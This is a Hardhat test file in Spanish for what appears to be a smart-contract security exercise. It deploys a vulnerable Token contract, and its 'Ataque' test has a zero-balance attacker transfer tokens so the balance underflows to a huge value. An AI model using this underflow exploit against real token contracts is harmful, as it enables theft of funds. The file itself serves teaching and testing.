const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 2", function () {

  let deployer, atacante;
  const INITIAL_SUPPLY = ethers.utils.parseUnits('1000','ether');

  beforeEach(async function () {

    [deployer, atacante] = await ethers.getSigners();

    // Se deploya el contrato vulnerable
    const Token = await ethers.getContractFactory("Token", deployer);
    this.contrato = await Token.deploy(INITIAL_SUPPLY);
    
    // Todo el initial supply es asignado a la cuenta que deploy√≥ el contrato
    expect(await this.contrato.balanceOf(deployer.address)).to.eq(INITIAL_SUPPLY);

    let balanceInicialAtacante = await this.contrato.balanceOf(atacante.address);

    expect(balanceInicialAtacante).to.eq('0');

    console.log(`El balance inicial del atacante es ${balanceInicialAtacante} tokens`);
  });

  it("Ataque", async function () {
    await this.contrato.connect(atacante).transfer(deployer.address, ethers.utils.parseEther('1'));

    let balanceAtacante = await this.contrato.balanceOf(atacante.address);

    expect(balanceAtacante).to.eq('115792089237316195423570985008687907853269984665640564039456584007913129639936');

  })
});
